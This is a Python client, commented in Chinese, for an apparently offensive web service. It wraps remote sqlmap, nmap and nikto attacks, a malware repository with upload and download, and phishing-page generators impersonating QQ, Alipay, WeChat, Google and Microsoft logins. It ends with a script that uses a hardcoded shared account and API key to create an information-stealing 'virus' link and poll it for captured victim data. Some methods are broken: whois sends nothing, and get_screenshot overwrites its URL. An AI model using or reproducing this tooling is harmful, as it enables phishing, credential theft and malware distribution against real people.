import requests
import json

user_server: str = "https://user.hackerstack.top"
api_server: str = "https://api.hackerstack.top"

class OpenHackerStackAPI:
    username: str
    password: str
    apiKey: str = "1230909dso0fjuj09f2i0932ikrd"
    
    def __init__(self, linwinsoft_username: str, linwinsoft_password: str):
        self.username = linwinsoft_username
        self.password = linwinsoft_password

    def send_mail(self, send_to: str, subject: str, content: str) -> str:
        url = f"{api_server}/send_mail/{self.username}/{self.password}"
        data = {
            "send_to": send_to,
            "subject": subject,
            "content": content
        }
        response = requests.post(url, data=json.dumps(data))
        return response.text
    
    def search_subdomain(self, domain: str) -> str:
        url = f"{api_server}/subdomain/" + domain
        return requests.get(url).text

    def get_ip_location(self, ip: str) -> str:
        url = f"{api_server}/get_ip_location/{ip}"
        return requests.get(url).text
    
    def sqlmap_attack(self, target_and_options: str) -> str:
        url = f"{api_server}/sqlmap/"
        data = {
            "command_values": target_and_options,
            "check": self.apiKey
        }
        response = requests.post(url, data=json.dumps(data))
        return response.text
    
    def nmap_attack(self, target_and_options: str) -> str:
        url = f"{api_server}/nmap/"
        data = {
            "command_values": target_and_options,
            "check": self.apiKey
        }
        response = requests.post(url, data=json.dumps(data))
        return response.text
    
    def website_dir_scan(self, target: str) -> str:
        url = f"{api_server}/dirb/"
        data = {
            "command_values": target,
            "check": self.apiKey
        }
        response = requests.post(url, data=json.dumps(data))
        return response.text
    
    def whois(self, domain: str) -> str:
        url = f"{api_server}/whois/"
        data = {
            "website" : domain
        }

    def make_qrcode(self, link: str) -> bytes:
        url = f"{api_server}/qrcode"
        data = {
            "link": link
        }
        response = requests.post(url, data=json.dumps(data))
        return response.content
    
    def get_screenshot(self, url: str) -> bytes:
        url = f"{api_server}/screenshot/"
        response = requests.post(url, data=url)
        return response.content
    
    def get_virus_list(self) -> str:
        '''
        这个api是用来获取HackerStack收集的病毒库的
        当然也可以上传病毒到病毒库
        '''
        url = f"{api_server}/get_virus_list"
        response = requests.get(url)
        return response.text
    
    def upload_virus(self, virus_name: str, virus_content: bytes) -> str:
        '''
        这个api是用来上传病毒到病毒库的
        '''
        url = f"{api_server}/update_virus/{virus_name}/{self.apiKey}"
        update_requests = requests.post(url, data=virus_content)
        return update_requests.text
    
    def create_socialEngine_token(self, type='QQ') -> str:
        '''
        这个api是用来生成社工token的，默认的type是QQ
        type有以下几种：
        1. QQ
        2. 163
        3. Alipay
        4. Baidu
        5. Google
        6. Microsoft
        7. MiHaYou
        8. WeChat
        '''
        url = f"{api_server}/api/{type}/{self.username}/{self.password}"
        response = requests.get(url)
        '''
        这里面返回的会是一个token，例如: V3vsO8DSMQ 这样类型的
        字符串，当用户访问: https://api.hackerstack.top/V3vsO8DSMQ/ 这样的链接时，
        就能访问到社工的页面了
        '''
        '''
        使用的是短轮询的方式，这样子更加贴合QQ机器人的操作习惯，用户可以随时通过token查看
        是否收到了消息
        '''
        return response.text
    
    '''
    段轮训查询收到的消息api
    '''
    def get_message(self, token: str) -> str:
        url = f"{api_server}/virus_run/{token}"
        data = {
            "command": "none"
        }
        response = requests.post(url,data=json.dumps(data))
        return response.text
    
    def GoogleProxy(self , link: str) -> str:
        '''
        这个api是镜像代理Google搜索引擎的
        link输入的内容大概就是类似于: /search?q=google
        '''
        return requests.get(f"{api_server}/GoogleProxy/{link}").text
    
    def DNS_Search(self, domain: str) -> str:
        '''
        domain输入的内容大概就是类似于: www.baidu.com
        '''
        return requests.get(f"{api_server}/dns_Search/{domain}").text
    
    def get_virus(self , virus_name: str) -> bytes:
        '''
        virus_name输入的内容大概就是类似于: virus.txt
        '''
        return requests.get(f"{api_server}/get_virus/{virus_name}").content

    def create_get_info_virus(self) -> str:
        '''
        创建一个被动式信息获取的病毒，返回病毒的Token，可以访问 https://api.hackerstack.top/获取的token
        可以通过 get_message() 来事实查看收到的信息，但是呢，如果是none说明没有收到信息
        '''
        url = f"{api_server}/api/VirusInfoGetter/{self.username}/{self.password}"
        r = requests.get(url)
        return r.text # 返回的token
    
    def nikto_scan(self, target: str) -> str:
        '''
        target输入的内容大概就是类似于: https://edu.hackerstack.top/
        '''
        return requests.get(f"{api_server}/bug_search/{self.apiKey}/{target}").text

# 用户名 linux 密码 linux 是特权账号，有的教育版设置续费到了2099年的
api = OpenHackerStackAPI("linux", "linux")
token = api.create_get_info_virus()
print("https://api.hackerstack.top/" + token)
while True:
    message = api.get_message(token)
    if message == "none":
        pass
    else:
        print(message)
        break